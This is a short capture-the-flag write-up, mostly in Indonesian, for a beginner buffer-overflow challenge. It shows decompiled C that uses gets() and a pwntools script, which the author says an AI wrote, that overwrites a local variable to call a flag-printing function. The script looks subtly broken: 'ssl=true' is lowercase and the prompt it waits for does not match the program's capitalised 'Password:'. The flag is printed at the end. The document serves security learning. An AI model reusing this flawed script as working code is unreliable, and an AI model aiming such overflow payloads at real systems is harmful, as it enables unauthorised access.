# Baby Pwn
**Author:** BbayuGt

**Difficulty:** Baby

---
## Description
A very secure system indeed

## Info
```
ncat babypwn.ctf.forestylab.com 5000 --ssl
```

## Enumeration
diberikan binary... menggunakan ghidra kita dapat melihat bahwa terdapat 2 fungsi,  main() dan give_flag()
```
undefined8 main(void)

{
  char local_58 [76];
  int local_c;
  
  local_c = 0;
  printf("Welcome to my very secure program!\nPassword: ");
  fflush(stdout);
  gets(local_58);
  if (local_c == 0) {
    puts("Access denied!");
  }
  else {
    puts("Access granted!");
    give_flag();
  }
  return 0;
}
```

```
void give_flag(void)

{
  system("cat flag.txt");
  return;
}

```

fungsi main terdapat 2 variable 
- variable type char yang menerima max 76 char
- variable int yg dimana nilainya ter-assign 0

kemudian dalam main juga terdapat kondisi yang memeriksa apakah nilai dari variable int itu 0 atau tidak... jika iya maka output string dan jika tidak maka memanggil give_flag() yg dimana give_flag() menampilkan flag.txt

problemnya adalah nilai dari variable int itu tidak dapat diganti dengan menginputkan ke dalam app 

maka kita dapat mengeksploitasi ini dengan cara membuat input overflow kemudian mengubah nilai dari variable int menjadi selain 0

sya minta ai untuk membuat scriptnya
```python
from pwn import *

# konfigurasi koneksi
host = "babypwn.ctf.forestylab.com"
port = 5000
p = remote(host, port, ssl=true)

padding = b"a" * 76
overwrite_value = p32(1) 

payload = padding + overwrite_value

print(p.recvuntil(b"password: ").decode())

p.sendline(payload)

print("payload sent. waiting for flag...")
print("--- server response ---")
print(p.recvall().decode())
print("-----------------------")

p.close()
```

## flag 
```
foresty{h0w_d1d_y0u_g3t_1n51d3_my_s7st3m?!_12788ad69abeadef}
```
